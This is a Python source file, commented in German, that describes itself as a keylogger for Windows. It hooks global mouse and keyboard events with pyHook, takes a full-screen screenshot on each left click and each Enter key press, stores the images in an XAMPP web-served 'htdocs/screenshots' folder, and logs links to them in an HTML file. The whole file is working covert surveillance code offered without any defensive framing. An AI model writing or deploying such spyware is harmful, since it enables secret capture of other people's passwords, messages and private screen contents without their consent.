# -*- coding: iso-8859-1 -*-
# Keylogger, der bei jedem linken Mausklick und pressen der Enter-taste einen Screenshot macht
import pythoncom # ermöglicht die Handhabung von Windows extensions
import pyHook # ermöglicht Keyboard- und Maushooks für Windows
from ctypes import * # ermöglicht Aufruf von dll's und shared libraries
import win32gui # Zugriff auf win32 API
import win32ui # Zugriff auf Mircosoft Foundation Classes (MFC)
import win32con # stellt Verbindung zu Bildschirm
import win32api # Zugriff auf win32 API
import os # Handhabung des Betriebssystems
import datetime  # Handhabung von Datum- und Zeitdaten

# Variablen zur Handhabung von Windows werden definiert
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_hwnd = 0

# Macht einen Screenshot und speichert diesen
# @param filename: str; Dateiname des Screenshots
def saveScreenshot(filename):
  # initialisiert Objekt hdesktop um Verbindung zu Bildschirm aufzubauen
  hdesktop = win32gui.GetDesktopWindow()
  # setzt Bildschirm-Pixel
  width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
  height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
  left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
  top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
  # erstellt Objekt-Kontext
  desktop_dc = win32gui.GetWindowDC(hdesktop)
  img_dc = win32ui.CreateDCFromHandle(desktop_dc)
  # erstellt Speicher-Objekt
  mem_dc = img_dc.CreateCompatibleDC()
  # erstellt bitmap-Objekt
  screenshot = win32ui.CreateBitmap()
  screenshot.CreateCompatibleBitmap(img_dc, width, height)
  mem_dc.SelectObject(screenshot)
  # kopiert Bildschirm in Speicher-Objekt
  mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
  # speichert screenshots in Ordner
  if not os.path.exists("C:\\xampp\\htdocs\\screenshots"):
    os.makedirs("C:\\xampp\\htdocs\\screenshots")
  screenshot.SaveBitmapFile(mem_dc, "C:\\xampp\\htdocs\\screenshots\\" + filename)
  # schreibt zu Datei
  WriteHTMLFile(filename)
  # Speicher und Objekt wieder frei geben
  mem_dc.DeleteDC()
  win32gui.DeleteObject(screenshot.GetHandle())

# Reaktion auf einen linken Mausklick
# Dateiname für Screenshot wird festgelegt
# @param event: obj; Event das ausgelöst wurde bei linkem Mausklick
# @return bool: beendet Methode erfolgreich
def onMouseEvent(event):
    # initialisierung des datetime-Objekts dt
    dt = datetime.datetime.now()
    # Dateiname besteht aus Key und dem Zeitpunkt des Screenshots
    screenshotTime = str(dt.day) + '_' + str(dt.month) + \
                     '_' + str(dt.year) + '_' + str(dt.hour) + \
                     '_' + str(dt.minute) + '_' + str(dt.second)
    filename = 'Mouse_' + screenshotTime + '.png'
    # tätigt uns sichert screenshot
    saveScreenshot(filename)
    return True

# Reaktion auf betätigen der Taste Enter
# Dateiname für Screenshot wird festgelegt
# @param event: obj; Event das ausgelöst wurde bei linkem Mausklick
# @return bool: beendet Methode erfolgreich
def onKeyEvent(event):
    # Name der Taste die getätigt wird
    keylog = event.Key
    # Fall Taste Enter ist, wird Dateiname gestzt und ein screenshot gemacht
    if keylog == 'Return':
        # initialisierung des datetime-Objekts dt
        dt = datetime.datetime.now()
        # Dateiname besteht aus Key und dem Zeitpunkt des Screenshots
        screenshotTime = str(dt.day) + '_' + str(dt.month) + \
                         '_' + str(dt.year) + '_,_' + str(dt.hour) + \
                         '_' + str(dt.minute) + '_' + str(dt.second)
        filename = event.Key + '_' + screenshotTime + '.png'
        # tätigt uns sichert screenshot
        saveScreenshot(filename)
    return True


# schreibt in Datei
# @param filename: str; Dateiname des Screenshots
def WriteHTMLFile(filename):
    # link zum Screenshot
    link = '<a href="http://localhost/screenshots/">' + filename + '</a>\n\r'
    # Modus a+ fuers updaten der datei
    file = open('./log.html', 'a+')
    file.write(link)
    file.close()


# Setzt Windows-Keylog-Events
def main():
    # initialisiert Instanz von HookManager
    hm = pyHook.HookManager()
    # setzt Mouse-Event
    hm.MouseLeftDown = onMouseEvent
    # 'hakt' Maus an Instanz hm
    hm.HookMouse()
    # setzt Key-Event
    hm.KeyDown = onKeyEvent
    # 'hakt' Keyboard an Instanz hm
    hm.HookKeyboard()
    # wartet auf Windows.events
    pythoncom.PumpMessages()

if __name__=='__main__':
    main()
